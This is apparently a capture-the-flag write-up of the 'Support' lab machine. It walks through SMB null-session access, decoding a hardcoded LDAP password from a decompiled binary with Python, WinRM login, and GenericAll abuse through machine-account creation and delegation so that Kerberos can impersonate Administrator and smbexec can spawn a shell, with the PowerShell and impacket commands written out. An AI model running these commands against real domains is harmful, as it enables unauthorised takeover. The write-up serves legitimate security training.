# Support

## Gaining Access

Nmap scan:

<figure><img src="../../../.gitbook/assets/image (2322).png" alt=""><figcaption></figcaption></figure>

### Null Session

I found that SMB accepts null credentials for this machine:

<figure><img src="../../../.gitbook/assets/image (1977).png" alt=""><figcaption></figcaption></figure>

Viewing the support-tools share, we find that it contains multiple binaries.

<figure><img src="../../../.gitbook/assets/image (1295).png" alt=""><figcaption></figcaption></figure>

There's only one that was interesting, and it was the `UserInfo.exe` file. I took it back to my Windows VM and used dnSpy to open it.

### dnSpy

When decompiled, it seems that the binary was sending LDAP queries:

<figure><img src="../../../.gitbook/assets/image (435).png" alt=""><figcaption></figcaption></figure>

Looking around, I also found this `password` function.

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

We can decode this easily using some Python and following their logic.

```python
import base64
enc_pass="0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key=b"armando"

array = base64.b64decode (enc_pass)
array1 = []

for i in range(len(array)):
        array1.append(chr(array[i] ^ key[i % len(key)] ^ 0xDF))

array1 = ''.join(array1)
print (array1)
```

This would output the password.

<figure><img src="../../../.gitbook/assets/image (1156).png" alt=""><figcaption></figcaption></figure>

### LDAPSearch

Then, since the binary does LDAP queries, I wanted to use the username and password given by the binary to query LDAP.

<figure><img src="../../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

On analysing the output, I found a hidden password for the `support` user.

<figure><img src="../../../.gitbook/assets/image (1088).png" alt=""><figcaption></figcaption></figure>

We can then `evil-winrm` in as this `support` user.

<figure><img src="../../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

Once in, I started Bloodhound to enumerate for me. Upon reviewing the contents, I saw this interesting set of permissions over the DC.

<figure><img src="../../../.gitbook/assets/image (2133).png" alt=""><figcaption></figcaption></figure>

We can use PowerMad and PowerView to abuse the `GenericAll` privileges.

### GenericAll Abuse

We can use this set of commands to create a new user:

{% code overflow="wrap" %}
```powershell
New-MachineAccount -MachineAccount (Get-Variable -Name "FAKE01").Value -Password $(ConvertTo-SecureString 'password@123' -AsPlainText -Force) -Verbose
Set-ADComputer (Get-Variable -Name "DC").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FAKE01").Value + '$')
Get-ADComputer (Get-Variable -Name "DC").Value -Properties PrincipalsAllowedToDelegateToAccount
# on Linux from here 
impacket-getST support.htb/fake01 -dc-ip <IP> -impersonate administrator -spn www/dc.support.htb
export KRB5CCNAME=administrator.ccache
smbexec.py support/Administrator@support.htb -no-pass -k
```
{% endcode %}

This would spawn in a shell for us.

How it works is that we first create a new user that has the Constrained Delegation privilege. Then, we are able to impersonate the administrator and request a ticket that we can use to gain a shell with `smbexec.py`.

<figure><img src="../../../.gitbook/assets/image (2883).png" alt=""><figcaption></figcaption></figure>
